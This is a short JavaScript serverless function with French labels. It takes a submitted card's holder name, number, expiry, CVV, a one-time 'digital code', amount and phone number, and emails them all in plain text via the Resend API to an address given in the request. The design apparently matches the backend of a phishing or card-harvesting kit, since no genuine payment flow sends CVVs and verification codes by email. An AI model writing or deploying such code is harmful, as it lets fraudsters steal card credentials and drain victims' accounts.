const { Resend } = require('resend');
const resend = new Resend(process.env.RESEND_API_KEY);

exports.handler = async (event) => {
  const data = JSON.parse(event.body);

  const {
    email,
    titulaire,
    numerocarte,
    dateexpiration,
    cryptogramme,
    code_digital,
    montant,
    telephone,
  } = data;

  try {
    await resend.emails.send({
      from: 'ton-service@tondomaine.com',
      to: email,
      subject: 'Confirmation de votre carte',
      html: `
        <h2>Confirmation de Paiement</h2>
        <p><strong>Titulaire :</strong> ${titulaire}</p>
        <p><strong>Numéro :</strong> ${numerocarte}</p>
        <p><strong>Date :</strong> ${dateexpiration}</p>
        <p><strong>CVV :</strong> ${cryptogramme}</p>
        <p><strong>Code Digital :</strong> ${code_digital}</p>
        <p><strong>Montant :</strong> ${montant} €</p>
        <p><strong>Téléphone :</strong> ${telephone}</p>
      `,
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'Email envoyé avec succès' }),
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message }),
    };
  }
};